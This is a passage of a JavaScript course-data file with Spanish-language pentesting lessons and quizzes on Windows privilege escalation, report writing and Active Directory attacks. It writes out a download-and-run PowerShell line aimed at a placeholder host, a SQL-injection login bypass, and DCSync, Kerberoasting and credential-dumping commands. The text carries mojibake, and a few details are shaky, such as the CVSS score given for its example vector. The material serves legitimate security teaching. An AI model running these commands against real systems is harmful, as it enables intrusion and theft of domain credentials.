PrintSpoofer.exe -i -c cmd

Crea un proceso cmd.exe con privilegios de SYSTEM usando el Print Spooler.

JUICYPOTATO â€” funciona en Windows Server 2016/2019 y Windows 10 anteriores:
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

Ambas herramientas estÃ¡n en GitHub. En pentesting legÃ­timo, las descargas en el servidor comprometido para ejecutarlas.

ROTTEN POTATO / SWEET POTATO â€” variantes para diferentes versiones de Windows.

La pregunta clave antes de usarlas: Â¿whoami /priv muestra SeImpersonatePrivilege como Enabled? Si sÃ­, estas herramientas funcionarÃ¡n con alta probabilidad.`
          },
          {
            tag: "AUTOMATIZACION",
            titulo: "WinPEAS â€” automatizar la bÃºsqueda",
            contenido: `WinPEAS (Windows Privilege Escalation Awesome Script) es el equivalente a LinPEAS pero para Windows. Busca automÃ¡ticamente todos los vectores conocidos de escalada.

Descarga y ejecuciÃ³n:
IEX(New-Object Net.WebClient).downloadString('http://TU_IP/winPEAS.ps1')

O subir el ejecutable:
winPEASx64.exe

WinPEAS busca automÃ¡ticamente:
â€” Privilegios de token explotables
â€” Servicios con permisos dÃ©biles
â€” Unquoted service paths
â€” Credenciales almacenadas en el registro
â€” Credenciales en archivos de configuraciÃ³n
â€” Tareas programadas modificables
â€” AlwaysInstallElevated (instalar MSI como SYSTEM)
â€” DLL hijacking oportunidades
â€” Software desactualizado con CVEs conocidos

El output estÃ¡ codificado por colores:
Rojo/Amarillo â†’ hallazgo importante, investiga
Verde â†’ configuraciÃ³n segura

Igual que LinPEAS: lee con criterio. No todo lo que marca es explotable en tu contexto especÃ­fico.

Siempre anota: hora de ejecuciÃ³n, herramienta usada, versiÃ³n, resultado completo.`
          },
        ],
        quiz: [
          {
            q: "whoami /priv muestra SeImpersonatePrivilege: Enabled. Â¿QuÃ© herramienta usas para escalar a SYSTEM en Windows Server 2019?",
            opts: ["JuicyPotato â€” funciona en todas las versiones de Windows", "PrintSpoofer â€” diseÃ±ado especÃ­ficamente para Windows 10/Server 2019 y posterior", "Mimikatz â€” extrae credenciales de memoria", "WinPEAS â€” escanea vulnerabilidades automÃ¡ticamente"],
            c: 1,
            e: "PrintSpoofer explota el Print Spooler para crear un proceso SYSTEM cuando tienes SeImpersonatePrivilege. JuicyPotato es para versiones anteriores. En Server 2019 y Windows 10 recientes, PrintSpoofer es la herramienta correcta."
          },
          {
            q: "Un servicio tiene la ruta: C:\\Program Files\\My App\\service.exe (sin comillas). Â¿Por quÃ© es vulnerable?",
            opts: ["Porque la ruta es demasiado larga para Windows", "Windows prueba mÃºltiples ubicaciones para resolver la ruta â€” si puedes crear C:\\Program.exe o C:\\Program Files\\My.exe, se ejecuta como SYSTEM cuando el servicio inicia", "Solo es vulnerable si el servicio tiene permisos de red", "No es vulnerable, Windows maneja los espacios correctamente"],
            c: 1,
            e: "Sin comillas en rutas con espacios, Windows interpreta ambigÃ¼edad: prueba C:\\Program.exe primero. Si puedes escribir en C:\\ o C:\\Program Files\\, colocas un ejecutable malicioso que se ejecuta con los privilegios del servicio (frecuentemente SYSTEM)."
          },
          {
            q: "Â¿Por quÃ© las cuentas de servicio de IIS frecuentemente tienen SeImpersonatePrivilege?",
            opts: ["Por un error de configuraciÃ³n â€” no deberÃ­an tenerlo nunca", "Porque IIS necesita impersonar usuarios para acceder a recursos en su nombre â€” es un comportamiento intencional, pero tambiÃ©n un vector de escalada si el servidor web es comprometido", "Solo en versiones antiguas de IIS", "Para poder reiniciar el servidor web automÃ¡ticamente"],
            c: 1,
            e: "IIS AppPool necesita SeImpersonatePrivilege para servir contenido en nombre de diferentes usuarios. Es funcionalidad legÃ­tima â€” pero significa que si comprometes el servidor web (como www-data en el contexto de IIS), heredas ese privilegio y puedes escalar a SYSTEM."
          },
          {
            q: "WinPEAS marca en rojo 'AlwaysInstallElevated: enabled'. Â¿QuÃ© significa?",
            opts: ["Que el sistema tiene las actualizaciones al dÃ­a", "Que los instaladores MSI siempre se ejecutan con privilegios de SYSTEM, independientemente del usuario que los instale â€” cualquier MSI malicioso escala privilegios", "Que el usuario actual es administrador", "Que el firewall de Windows estÃ¡ habilitado"],
            c: 1,
            e: "AlwaysInstallElevated es una polÃ­tica que permite a usuarios sin privilegios instalar software con privilegios de SYSTEM. Si estÃ¡ habilitada en HKCU y HKLM, crear un MSI malicioso (msfvenom -f msi) y ejecutarlo te da SYSTEM automÃ¡ticamente."
          },
          {
            q: "Encuentras credenciales en el registro de Windows: HKLM\\SOFTWARE\\config con 'password=Admin123'. Â¿QuÃ© haces primero?",
            opts: ["Las usas inmediatamente para escalar privilegios", "Las anotas con la ruta exacta del registro, la hora del hallazgo, y evalÃºas si estÃ¡n dentro del scope antes de probarlas en otros sistemas", "Las reportas al cliente sin investigar mÃ¡s", "Las ignoras porque probablemente son antiguas"],
            c: 1,
            e: "Documentar primero es siempre la respuesta correcta. La ruta del registro, el valor exacto, la hora. Luego evalÃºas: Â¿en quÃ© sistemas del scope tiene sentido probar esta credencial? Â¿EstÃ¡ autorizado en el contrato? Actuar sin documentar primero es un error profesional."
          },
        ]
      },
    ]
  },

  {
    id: "rt-7",
    nombre: "El Informe Final",
    icon: "ðŸ“‹",
    color: "#ffd700",
    tag: "FREE",
    descripcion: "El cliente paga por el informe, no por los hallazgos. Aprende a comunicar vulnerabilidades con impacto real y recomendaciones accionables.",
    lecciones: [
      {
        id: "rt-7-1",
        titulo: "Estructura del informe profesional",
        slides: [
          {
            tag: "EL INFORME",
            titulo: "Por quÃ© el informe es el producto real",
            contenido: `El cliente no vio nada de lo que hiciste durante dos semanas. Lo Ãºnico que recibe y puede usar para mejorar su seguridad es el informe.

Un pentester que encuentra 10 vulnerabilidades pero las documenta mal entrega menos valor que uno que encuentra 5 y las explica perfectamente.

El informe tiene dos audiencias completamente distintas con necesidades distintas:

EJECUTIVOS (CEO, CISO, directores):
No son tÃ©cnicos. No les importa quÃ© exploit usaste. Les importa:
â€” Â¿CÃ³mo de expuesta estÃ¡ la empresa?
â€” Â¿QuÃ© puede pasar si un atacante real entra?
â€” Â¿CuÃ¡nto cuesta arreglarlo vs cuÃ¡nto cuesta no arreglarlo?
â€” Â¿QuÃ© priorizamos primero?

TÃ‰CNICOS (sysadmins, desarrolladores, equipo de seguridad):
Necesitan detalles precisos para reproducir y arreglar:
â€” Pasos exactos de reproducciÃ³n
â€” Herramientas y comandos usados
â€” Evidencia (screenshots, logs)
â€” RecomendaciÃ³n especÃ­fica con recursos

El informe profesional tiene ambas secciones separadas claramente.`
          },
          {
            tag: "ESTRUCTURA",
            titulo: "Secciones del informe",
            contenido: `ESTRUCTURA ESTÃNDAR:

1. PORTADA
Nombre del cliente, fecha, clasificaciÃ³n (Confidencial), versiÃ³n del documento.

2. RESUMEN EJECUTIVO (1-2 pÃ¡ginas)
Para no tÃ©cnicos. Responde:
â€” Objetivo del proyecto
â€” MetodologÃ­a usada (no tÃ©cnica)
â€” Resumen de hallazgos por criticidad (grÃ¡fico)
â€” Riesgo general (CrÃ­tico / Alto / Medio / Bajo)
â€” Las 3 recomendaciones mÃ¡s urgentes

3. ALCANCE Y METODOLOGÃA
QuÃ© sistemas se probaron, durante quÃ© fechas y horarios, quÃ© herramientas, quÃ© tipo de pruebas (caja negra, blanca, gris).

4. HALLAZGOS (el cuerpo del informe)
Uno por uno, cada vulnerabilidad con:
â€” TÃ­tulo descriptivo
â€” PuntuaciÃ³n CVSS
â€” DescripciÃ³n del problema
â€” Pasos de reproducciÃ³n
â€” Evidencia (capturas de pantalla)
â€” Impacto real
â€” RecomendaciÃ³n especÃ­fica

5. APÃ‰NDICES
Herramientas usadas, cÃ³digo de exploits, logs completos.`
          },
          {
            tag: "CVSS",
            titulo: "PuntuaciÃ³n CVSS â€” cÃ³mo calcularla",
            contenido: `CVSS (Common Vulnerability Scoring System) es el estÃ¡ndar de la industria para puntuar la severidad de vulnerabilidades. Va de 0 a 10.

Escala:
0.0       â†’ Ninguna
0.1 - 3.9  â†’ Baja
4.0 - 6.9  â†’ Media
7.0 - 8.9  â†’ Alta
9.0 - 10.0 â†’ CrÃ­tica

CVSS tiene tres grupos de mÃ©tricas:

BASE (el mÃ¡s importante):
Attack Vector (AV): Network/Adjacent/Local/Physical
Attack Complexity (AC): Low/High
Privileges Required (PR): None/Low/High
User Interaction (UI): None/Required
Scope (S): Changed/Unchanged
Confidentiality (C): None/Low/High
Integrity (I): None/Low/High
Availability (A): None/Low/High

Ejemplo â€” SQLi en login web:
AV:N (Network, accesible desde internet)
AC:L (Low, fÃ¡cil de explotar)
PR:N (None, no necesita autenticaciÃ³n)
UI:N (None, no requiere interacciÃ³n del usuario)
S:C (Changed, afecta la base de datos tambiÃ©n)
C:H (High, puede leer toda la DB)
I:H (High, puede modificar datos)
A:L (Low, puede afectar disponibilidad)

Resultado: CVSS 9.8 â€” CrÃ­tico

Calculadora online: cvss-calculator.com o nvd.nist.gov/vuln-metrics/cvss/v3-calculator`
          },
          {
            tag: "HALLAZGO",
            titulo: "CÃ³mo redactar un hallazgo",
            contenido: `Cada hallazgo sigue un formato consistente. AquÃ­ un ejemplo real:

HALLAZGO: SQL Injection en panel de login
CVSS: 9.8 (CrÃ­tico)
CVE RELACIONADO: CWE-89

DESCRIPCIÃ“N:
El campo "email" del formulario de autenticaciÃ³n en https://drupal.example.com/user/login es vulnerable a SQL Injection. El servidor construye la query de autenticaciÃ³n concatenando directamente el input del usuario sin sanitizaciÃ³n ni uso de Prepared Statements.

PASOS DE REPRODUCCIÃ“N:
1. Navegar a https://drupal.example.com/user/login
2. Ingresar en el campo email: ' OR '1'='1
3. Ingresar cualquier valor en el campo password
4. Hacer click en "Iniciar sesiÃ³n"
5. Observar acceso concedido como administrador

EVIDENCIA: [Captura 01 - SQLi_bypass.png]

IMPACTO:
Un atacante no autenticado puede autenticarse en el panel de administraciÃ³n sin credenciales vÃ¡lidas, obteniendo control total del CMS. Adicionalmente, es posible extraer la base de datos completa incluyendo credenciales de usuarios y datos de clientes.

RECOMENDACIÃ“N:
Implementar Prepared Statements (Parametrized Queries) en todas las consultas SQL. Ejemplo en PHP: $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?'); $stmt->execute([$email]);
Referencia: OWASP SQL Injection Prevention Cheat Sheet.`
          },
          {
            tag: "RECOMENDACIONES",
            titulo: "Recomendaciones que el cliente puede ejecutar",
            contenido: `Una recomendaciÃ³n vaga no sirve. "Mejorar la seguridad" no le dice al desarrollador quÃ© hacer el lunes.

UNA MALA RECOMENDACION:
"Sanitizar los inputs del usuario para prevenir ataques de inyecciÃ³n."

UNA BUENA RECOMENDACION:
"Reemplazar la construcciÃ³n dinÃ¡mica de queries SQL con Prepared Statements en todas las consultas de la aplicaciÃ³n. En PHP/PDO: $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?'); $stmt->execute([$email]);. Para el framework Drupal especÃ­ficamente, usar la Database API: db_query('SELECT * FROM {users} WHERE email = :email', [':email' => $email]);. Referencia tÃ©cnica: OWASP SQL Injection Prevention Cheat Sheet (https://cheatsheetseries.owasp.org)."

Cada recomendaciÃ³n debe responder:
â€” QUÃ‰ hacer exactamente (no "mejorar", sino la acciÃ³n especÃ­fica)
â€” CÃ“MO hacerlo (ejemplo de cÃ³digo o configuraciÃ³n)
â€” DÃ“NDE aplicarlo (archivo, funciÃ³n, componente especÃ­fico)
â€” Referencia a estÃ¡ndar o documentaciÃ³n

Incluir tambiÃ©n la PRIORIDAD:
CrÃ­tico â†’ arreglar en las prÃ³ximas 24-48 horas
Alto â†’ arreglar en la prÃ³xima semana
Medio â†’ arreglar en el prÃ³ximo sprint
Bajo â†’ arreglar en la prÃ³xima versiÃ³n mayor`
          },
        ],
        quiz: [
          {
            q: "Â¿Por quÃ© el informe tiene secciones separadas para ejecutivos y tÃ©cnicos?",
            opts: ["Para hacer el informe mÃ¡s largo y justificar el precio", "Porque tienen necesidades completamente distintas: los ejecutivos toman decisiones de negocio y riesgo, los tÃ©cnicos necesitan detalles para reproducir y arreglar vulnerabilidades", "Por un requisito legal de todos los estÃ¡ndares de seguridad", "Para que el cliente pague por dos informes separados"],
            c: 1,
            e: "El resumen ejecutivo responde 'Â¿estamos en riesgo y cuÃ¡nto cuesta arreglarlo?' para quien aprueba el presupuesto. Los hallazgos tÃ©cnicos responden 'Â¿cÃ³mo reproduzco y arreglo esto?' para quien implementa los cambios. Mezclarlos hace el informe inÃºtil para ambas audiencias."
          },
          {
            q: "Una vulnerabilidad de SQLi tiene CVSS 9.8 y otra de XSS tiene CVSS 6.5. Â¿Siempre priorizas la SQLi?",
            opts: ["SÃ­, siempre se ordena por puntuaciÃ³n CVSS de mayor a menor", "No necesariamente â€” el contexto importa. Si el XSS estÃ¡ en el panel admin que todos usan y la SQLi estÃ¡ en un sistema de staging sin datos reales, el impacto real puede ser inverso", "SÃ­, CVSS es absoluto y no depende del contexto", "No, siempre se prioriza por el costo de remedaciÃ³n"],
            c: 1,
            e: "CVSS mide severidad tÃ©cnica abstracta. La priorizaciÃ³n real combina CVSS + contexto del negocio: Â¿quÃ© sistema es mÃ¡s crÃ­tico? Â¿EstÃ¡ expuesto a internet? Â¿Tiene datos sensibles? Â¿QuÃ© impacto tiene en la operaciÃ³n del cliente? Un CVSS 6.5 en un sistema crÃ­tico puede ser mÃ¡s urgente que un CVSS 9.8 en un sistema aislado."
          },
          {
            q: "Â¿QuÃ© hace que una recomendaciÃ³n sea accionable?",
            opts: ["Que use tÃ©rminos tÃ©cnicos precisos que demuestren expertise", "Que especifique QUÃ‰ hacer, CÃ“MO hacerlo con ejemplo concreto, DÃ“NDE aplicarlo y una referencia a documentaciÃ³n oficial", "Que sea lo mÃ¡s breve posible para facilitar la lectura", "Que incluya el tiempo estimado de implementaciÃ³n"],
            c: 1,
            e: "Una recomendaciÃ³n accionable le dice al desarrollador exactamente quÃ© hacer el lunes. 'Sanitizar inputs' no lo hace. 'Usar Prepared Statements, aquÃ­ el ejemplo de cÃ³digo para tu framework especÃ­fico, aquÃ­ la documentaciÃ³n de OWASP' sÃ­ lo hace."
          },
          {
            q: "El cliente pide el informe en 24 horas pero necesitas mÃ¡s tiempo para documentar bien. Â¿QuÃ© haces?",
            opts: ["Entregas en 24 horas aunque quede incompleto â€” cumplir plazos es lo primero", "Comunicas al cliente que necesitas mÃ¡s tiempo para entregar un informe de calidad, explicas quÃ© estÃ¡ pendiente y acuerdas una nueva fecha realista", "Entregas solo el resumen ejecutivo en 24 horas y el tÃ©cnico despuÃ©s", "No dices nada y entregas tarde sin avisar"],
            c: 1,
            e: "La comunicaciÃ³n proactiva con el cliente es parte del profesionalismo. Un informe apresurado con hallazgos mal documentados o recomendaciones vagas tiene menos valor que uno bien hecho. El cliente prefiere saberlo con anticipaciÃ³n para planificar."
          },
          {
            q: "Â¿QuÃ© secciÃ³n del informe lee primero el CEO de la empresa cliente?",
            opts: ["Los hallazgos tÃ©cnicos detallados para entender el alcance real", "El resumen ejecutivo â€” diseÃ±ado especÃ­ficamente para no tÃ©cnicos, resume el riesgo en lenguaje de negocio y las acciones prioritarias", "Los apÃ©ndices con los logs completos de las herramientas", "La secciÃ³n de metodologÃ­a para validar que el trabajo fue correcto"],
            c: 1,
            e: "El resumen ejecutivo es la secciÃ³n mÃ¡s importante estratÃ©gicamente. Es lo que el CEO lee, el CISO presenta al board y lo que determina si se aprueba el presupuesto para remedaciÃ³n. Si no estÃ¡ bien escrito en lenguaje de negocio, el informe tÃ©cnico mÃ¡s brillante no genera cambios."
          },
        ]
      },
    ]
  },

  {
    id: "rt-8",
    nombre: "Active Directory â€” Atacando el CorazÃ³n de Windows",
    icon: "ðŸ°",
    color: "#a855f7",
    tag: "FREE",
    descripcion: "Active Directory controla toda la infraestructura Windows corporativa. Aprende Kerberoasting, Pass-the-Hash, BloodHound y DCSync.",
    lecciones: [
      {
        id: "rt-8-1",
        titulo: "QuÃ© es Active Directory y por quÃ© importa",
        slides: [
          {
            tag: "ACTIVE DIRECTORY",
            titulo: "El directorio que controla todo",
            contenido: `Active Directory (AD) es el servicio de Microsoft para gestionar identidades y acceso en redes Windows corporativas. Si una empresa usa Windows en sus servidores y computadoras, casi con certeza tiene Active Directory.

Estructura bÃ¡sica:

DOMINIO â†’ la unidad administrativa central
Ejemplo: corp.lumina.local
Todos los usuarios, computadoras e impresoras del dominio son gestionados centralmente.

DOMAIN CONTROLLER (DC) â†’ el servidor que gestiona el dominio
Almacena todas las credenciales
Autentica a todos los usuarios
Aplica todas las polÃ­ticas de seguridad
Controla el acceso a todos los recursos

USUARIOS â†’ cuentas del dominio
johndoe@corp.lumina.local puede iniciar sesiÃ³n en cualquier computadora del dominio.

GRUPOS â†’ colecciones de usuarios con los mismos permisos
Domain Admins â†’ acceso total a todo el dominio
Enterprise Admins â†’ acceso a todos los dominios del forest

Si comprometes el Domain Controller â†’ tienes control total de todo. Cada usuario, cada computadora, cada servidor del dominio. Es el objetivo final de cualquier red Windows corporativa.`
          },
          {
            tag: "KERBEROS",
            titulo: "CÃ³mo funciona la autenticaciÃ³n Kerberos",
            contenido: `Active Directory usa Kerberos para autenticar usuarios. Entenderlo es fundamental para entender los ataques.

FLUJO DE AUTENTICACION:

1. El usuario se autentica en el DC
   â†’ El DC emite un Ticket Granting Ticket (TGT)
   â†’ Cifrado con el hash de la contraseÃ±a de la cuenta krbtgt

2. El usuario quiere acceder a un servicio (ej: SQL Server)
   â†’ Presenta el TGT al DC y pide un Ticket Granting Service (TGS)
   â†’ El DC emite el TGS cifrado con el hash de la cuenta del servicio

3. El usuario presenta el TGS al servicio
   â†’ El servicio descifra el TGS con su propio hash
   â†’ Si es vÃ¡lido, permite el acceso

PUNTOS CLAVE PARA LOS ATAQUES:
â€” El TGS estÃ¡ cifrado con el hash de la cuenta del servicio
â€” Cualquier usuario del dominio puede pedir un TGS para cualquier servicio
â€” Si crackeas el hash del TGS, tienes la contraseÃ±a de la cuenta del servicio
â€” Si esa cuenta tiene privilegios elevados... escalaste.

Esto es exactamente lo que explota Kerberoasting.`
          },
          {
            tag: "KERBEROASTING",
            titulo: "Kerberoasting â€” robar tickets de servicio",
            contenido: `Kerberoasting aprovecha que cualquier usuario autenticado puede pedir un TGS para cualquier cuenta de servicio con SPN (Service Principal Name).

PASO A PASO:

1. Enumerar cuentas de servicio con SPN:
GetUserSPNs.py -request corp.lumina.local/usuario:contraseÃ±a

Resultado:
ServicePrincipalName: MSSQLSvc/sqlserver.corp.lumina.local:1433
Nombre de cuenta: svc_sql
Hash: $krb5tgs$23$*svc_sql$...

2. El hash es el TGS cifrado con la contraseÃ±a de svc_sql
   Puedes intentar crackearlo offline sin generar mÃ¡s trÃ¡fico en la red.

3. Crackear el hash con hashcat:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

Si la contraseÃ±a de svc_sql es dÃ©bil, la obtienes en minutos.

POR QUÃ‰ ES PELIGROSO:
â€” No requiere privilegios especiales â€” cualquier usuario del dominio puede hacerlo
â€” El trÃ¡fico parece legÃ­timo para los logs del DC
â€” Las cuentas de servicio frecuentemente tienen contraseÃ±as que nunca se cambian
â€” Muchas cuentas de servicio tienen privilegios elevados

MitigaciÃ³n: contraseÃ±as largas (25+) en cuentas de servicio, Group Managed Service Accounts (gMSA).`
          },
          {
            tag: "BLOODHOUND",
            titulo: "BloodHound â€” mapear Active Directory",
            contenido: `BloodHound es la herramienta mÃ¡s poderosa para analizar Active Directory. Recolecta datos del dominio y los muestra como un grafo de relaciones, revelando caminos de ataque que serÃ­an invisibles de otra forma.

COMPONENTES:
SharpHound â†’ recolector de datos (corre en la red del cliente)
BloodHound GUI â†’ visualizador del grafo (corre en tu mÃ¡quina)
Neo4j â†’ base de datos de grafos donde se almacenan los datos

RECOLECTAR DATOS:
SharpHound.exe -c All
O desde Python:
bloodhound-python -u usuario -p contraseÃ±a -d corp.lumina.local -c all

Genera archivos JSON con todos los usuarios, grupos, computadoras, sesiones y permisos del dominio.

IMPORTAR Y ANALIZAR:
1. Importar los JSON en BloodHound
2. Buscar: "Shortest Paths to Domain Admins"
3. BloodHound muestra el camino exacto desde tu cuenta actual hasta Domain Admin

Ejemplo de hallazgo en BloodHound:
Tu cuenta â†’ GenericWrite sobre Grupo_IT â†’ Grupo_IT tiene DCSync rights â†’ Domain Controller

TraducciÃ³n: puedes modificar el grupo IT, agregar tu cuenta, y con DCSync obtener todos los hashes del dominio.

BloodHound hace visible en 30 segundos lo que tomarÃ­a dÃ­as de anÃ¡lisis manual.`
          },
          {
            tag: "DCSYNC",
            titulo: "DCSync â€” volverse el Domain Controller",
            contenido: `DCSync es el ataque final en Active Directory. Imita la funciÃ³n de replicaciÃ³n del Domain Controller para extraer los hashes de contraseÃ±as de TODOS los usuarios del dominio, incluido el hash de krbtgt.

PRERREQUISITO:
Necesitas una cuenta con privilegios de replicaciÃ³n (DS-Replication-Get-Changes-All):
â€” Domain Admins
â€” Enterprise Admins
â€” Domain Controllers
â€” Cuentas con permisos delegados explÃ­citamente

EJECUCIÃ“N:
Con Impacket:
secretsdump.py corp.lumina.local/Domain_Admin:contraseÃ±a@10.0.0.10

Con Mimikatz (desde una sesiÃ³n en el DC):
lsadump::dcsync /domain:corp.lumina.local /all

RESULTADO:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Con el hash de krbtgt puedes crear un Golden Ticket â€” un TGT falso que te da acceso a cualquier recurso del dominio para siempre, incluso si se cambian todas las contraseÃ±as (excepto krbtgt dos veces).

EN EL INFORME:
DCSync exitoso = compromiso total del dominio. Impacto: CrÃ­tico. Todas las credenciales del dominio deben considerarse comprometidas.`
          },
        ],
        quiz: [
          {
            q: "Â¿Por quÃ© el Domain Controller es el objetivo mÃ¡s valioso en una red Windows corporativa?",
            opts: ["Porque tiene el hardware mÃ¡s potente de la red", "Porque almacena todas las credenciales del dominio y controla la autenticaciÃ³n y acceso de todos los usuarios y sistemas â€” comprometer el DC significa comprometer toda la organizaciÃ³n", "Porque tiene mÃ¡s ancho de banda que otros servidores", "Solo es valioso si tiene servicios web expuestos"],
            c: 1,
            e: "El DC es la autoridad central de Active Directory. Controla quiÃ©n puede autenticarse, quÃ© pueden hacer y a quÃ© pueden acceder. Con acceso al DC puedes crear cuentas, modificar permisos, acceder a cualquier sistema del dominio y extraer todas las credenciales."
          },
          {
            q: "Â¿Por quÃ© Kerberoasting es difÃ­cil de detectar?",
            opts: ["Porque usa trÃ¡fico cifrado de extremo a extremo", "Porque la peticiÃ³n de TGS es una operaciÃ³n legÃ­tima â€” cualquier usuario puede pedir tickets de servicio, el trÃ¡fico parece normal para los logs del DC", "Porque solo funciona fuera del horario de trabajo", "Porque no genera trÃ¡fico de red"],
            c: 1,
            e: "Kerberoasting solicita TGS usando funcionalidades legÃ­timas de Kerberos. El DC registra la peticiÃ³n como una autenticaciÃ³n normal. El crackeo del hash se hace offline, sin mÃ¡s contacto con el DC. Sin alertas especÃ­ficas para volumen inusual de TGS requests, pasa desapercibido."
          },
          {
            q: "BloodHound muestra que tu cuenta tiene 'GenericWrite' sobre el grupo 'HelpDesk', y HelpDesk tiene 'AdminTo' sobre varios servidores. Â¿CÃ³mo lo explicas en el informe?",
            opts: ["Es una configuraciÃ³n normal de Active Directory que no representa riesgo", "Tu cuenta puede modificar la membresÃ­a del grupo HelpDesk, agregarte a Ã©l, y obtener acceso de administrador local en todos los servidores donde HelpDesk es admin â€” chain attack documentada con BloodHound", "Solo es relevante si los servidores son Domain Controllers", "El riesgo es bajo porque requiere mÃºltiples pasos"],
            c: 1,
            e: "BloodHound es precisamente para mostrar estos caminos de ataque encadenados. Cada paso individual parece menor, pero la cadena completa tiene impacto crÃ­tico. En el informe documentas cada paso del path con screenshots de BloodHound y comandos exactos."
          },
          {
            q: "Â¿QuÃ© hace que DCSync sea mÃ¡s impactante que cualquier otro ataque en Active Directory?",
            opts: ["Porque es el Ãºnico que funciona remotamente", "Porque extrae los hashes de TODOS los usuarios del dominio incluyendo krbtgt, permitiendo Pass-the-Hash masivo y Golden Tickets â€” compromiso total e irrecuperable a menos que se resetee krbtgt dos veces", "Porque no requiere ningÃºn privilegio previo", "Porque funciona en todos los sistemas operativos"],
            c: 1,
            e: "DCSync + hash de krbtgt = Golden Ticket. Un Golden Ticket es un TGT forjado que el DC no puede distinguir de uno legÃ­timo. TÃ©cnicamente, si el atacante tiene el hash de krbtgt, puede mantener acceso indefinidamente incluso si se cambian todas las contraseÃ±as del dominio."
          },
          {
            q: "Un cliente tiene cuentas de servicio con contraseÃ±as de 8 caracteres que no se han cambiado en 3 aÃ±os. Â¿Por quÃ© es crÃ­tico?",
            opts: ["No es crÃ­tico si las contraseÃ±as tienen caracteres especiales", "Kerberoasting puede extraer los hashes TGS de esas cuentas y crackearlos offline â€” contraseÃ±as cortas y viejas son extremadamente vulnerables a ataques de diccionario con GPUs modernas", "Solo es crÃ­tico si las cuentas tienen acceso a internet", "Las contraseÃ±as de servicio no se pueden crackear con mÃ©todos modernos"],
            c: 1,
            e: "Una contraseÃ±a de 8 caracteres puede crackearse en minutos con hashcat y una GPU moderna, especialmente si es un patrÃ³n comÃºn. Las cuentas de servicio que nunca cambian contraseÃ±a son el objetivo perfecto de Kerberoasting. RecomendaciÃ³n: 25+ caracteres aleatorios o Group Managed Service Accounts (gMSA)."
          },
        ]
      },
    ]
  },
];